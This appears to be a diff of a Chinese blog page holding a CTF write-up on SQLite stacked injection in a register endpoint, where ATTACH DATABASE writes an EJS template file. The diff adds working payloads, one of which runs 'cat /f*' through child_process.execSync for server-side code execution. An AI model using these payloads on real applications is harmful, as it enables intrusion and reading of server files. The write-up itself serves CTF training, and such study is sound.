@@ -1549,21 +1549,29 @@
 </span></span><span class="line"><span class="cl"><span class="p">});</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>漏洞点显然是登入出，可以进行sqlite注入，只不过注入的是ejs恶意文件</p>
+</div><p>而且在login和register处是存在sql注入的</p>
+<p>但是这里有一个坑就是login处的db.get函数不支持执行多条sql语句，也就是说不能堆叠注入。而在register处的db.exec是支持的。</p>
+<p>所以我们可以在register处通过sqlite创建数据库文件的方式，去写ejs模板，打ejs模板渲染</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;);ATTACH DATABASE &#39;</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">views</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">ejs</span><span class="s1">&#39; AS z3;create TABLE z3.exp (paylo</span>
-</span></span><span class="line"><span class="cl"><span class="n">ad</span> <span class="n">text</span><span class="p">);</span> <span class="n">insert</span> <span class="n">INTO</span> <span class="n">z3</span><span class="o">.</span><span class="n">exp</span> <span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="n">VALUES</span> <span class="p">(</span><span class="s1">&#39;&lt;%= process.mainModule.requ</span>
-</span></span><span class="line"><span class="cl"><span class="n">ire</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;cat /f*&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span> <span class="o">%&gt;</span><span class="s1">&#39;);--</span>
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;);ATTACH DATABASE &#39;</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">views</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">ejs</span><span class="s1">&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;</span><span class="o">&lt;%-</span> <span class="n">include</span><span class="p">(</span><span class="s2">&#34;/fla4444444aaaaaagg.txt&#34;</span><span class="p">);</span> <span class="o">%&gt;</span><span class="s1">&#39;);--</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="s1">&#39;);ATTACH DATABASE &#39;</span><span class="o">/</span><span class="n">app</span><span class="o">/</span><span class="n">views</span><span class="o">/</span><span class="n">upload</span><span class="o">.</span><span class="n">ejs</span><span class="s1">&#39; AS z3;create TABLE z3.exp (payload text); insert INTO z3.exp (payload) VALUES (&#39;</span><span class="o">&lt;%=</span> <span class="n">process</span><span class="o">.</span><span class="n">mainModule</span><span class="o">.</span><span class="n">require</span><span class="p">(</span><span class="s2">&#34;child_process&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">execSync</span><span class="p">(</span><span class="s2">&#34;cat /f*&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">toString</span><span class="p">()</span> <span class="o">%&gt;</span><span class="s1">&#39;);--</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><a class="link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d49faf9874bc964e855c2d2ce46764c0552fa99a/SQL%20Injection/SQLite%20Injection.md#attach-database"  target="_blank" rel="noopener"
     >https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d49faf9874bc964e855c2d2ce46764c0552fa99a/SQL%20Injection/SQLite%20Injection.md#attach-database</a></p>
+<p><a class="link" href="https://blog.xrntkk.top/post/ycb2025-record/"  target="_blank" rel="noopener"
+    >羊城杯2025 金Java&amp;ezsigin Writeup | Xrntkk&rsquo;s Blog</a></p>
 
 </section>
 
@@ -1606,6 +1614,32 @@
             
                 
 <article class="">
+    <a href="/p/rce%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">RCE与文件包含总结</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%96%B0%E5%8D%8E%E4%B8%89%E5%AE%9E%E4%B9%A0%E6%89%93%E9%9D%B6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">新华三实习打靶</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/%E6%B1%9F%E8%A5%BF%E7%9C%81%E8%B5%9Bawdp/">
         
         
@@ -1638,32 +1672,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-江西省振兴杯</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-%E5%BC%BA%E7%BD%91%E6%9D%AF/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-强网杯</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-susctf/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-SUSCTF</h2>
         </div>
     </a>
 </article>
